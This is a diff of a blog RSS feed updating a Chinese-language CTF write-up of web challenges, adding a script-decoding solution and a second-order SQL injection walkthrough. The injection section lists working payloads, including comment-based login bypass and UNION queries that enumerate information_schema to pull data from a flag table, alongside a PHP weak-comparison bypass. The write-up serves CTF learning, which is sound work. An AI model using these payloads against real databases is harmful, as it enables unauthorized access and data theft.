@@ -12,7 +12,8 @@
         <pubDate>Fri, 18 Mar 2022 00:00:00 +0000</pubDate>
         
         <guid>https://ginkgo.org.cn/posts/pwnthebox_web_easy/</guid>
-        <description>&lt;h2 id=&#34;exec1&#34;&gt;exec1&lt;/h2&gt;
+        <description>&lt;p&gt;&amp;lt;!&amp;ndash;more&amp;ndash;&amp;gt;&lt;/p&gt;
+&lt;h2 id=&#34;exec1&#34;&gt;exec1&lt;/h2&gt;
 &lt;p&gt;命令行执行
 先读源码，&lt;/p&gt;
 &lt;p&gt;首先，脚本用str_replace替换了所有特殊字符，由于是单独字符的替换，没有办法利用双写绕过，接着考虑下面命令行中如果执行额外的命令
@@ -242,8 +243,14 @@
 
 &lt;h2 id=&#34;奇葩的题目&#34;&gt;奇葩的题目&lt;/h2&gt;
 &lt;p&gt;根据提示查看源码&lt;/p&gt;
-&lt;!-- raw HTML omitted --&gt;
-&lt;!-- raw HTML omitted --&gt;
+&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-21_15-06-54_screenshot.png&#34; width=&#34;400px&#34;/&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;发现script执行将逃逸后的url编码过的代码，以此解码p1, p2 以及%35%34%61%61%32，得到script内容：&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-21_15-08-22_screenshot.png&#34; width=&#34;400px&#34;/&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;得到满足等式的值，继而得到flag&lt;/p&gt;
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-21_15-08-58_screenshot.png&#34; width=&#34;400px&#34;/&gt;
 &lt;/figure&gt;
 
@@ -377,7 +384,32 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;flag{**********}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;读源码，很容易发现这里存在一个弱类型比较
-?num=1a 即可绕过得到flag&lt;/p&gt;</description>
+?num=1a 即可绕过得到flag&lt;/p&gt;
+&lt;h2 id=&#34;twice-sql-injection&#34;&gt;Twice SQL Injection&lt;/h2&gt;
+&lt;p&gt;根据提示是二次注入（也可以叫 &lt;code&gt;Second-order injection&lt;/code&gt; ）
+一般来说（就我所见过的），后端的脚本只会对注册所传输的变量进行严格的过滤，而在登陆的时候，却没有进行二次确认&lt;/p&gt;
+&lt;p&gt;因此我们测试注册几个用户名&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 测试是否可以登陆admin账号
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; -- -
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;admin&amp;#34; -- -
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;# 测试直接获取信息
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;-1 union select database()-- -
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;-1&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#成功
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; union select database()-- -
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;-1&amp;#39;) union select database()-- -
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;-1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现  &lt;code&gt;-1&#39; union select database()-- -&lt;/code&gt; 返回了database信息&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-04-26_22-16-03_screenshot.png&#34; width=&#34;300px&#34;/&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;那么接下来就是正常流程&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select group_concat(table_name) from information_schema.tables where table_schema=&amp;#34;ctftraining&amp;#34;-- -
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;-1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;column_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;columns&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- -
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select group_concat(flag, &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) from flag-- -
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;即可获得flag&lt;/p&gt;
+</description>
         </item>
         
     </channel>
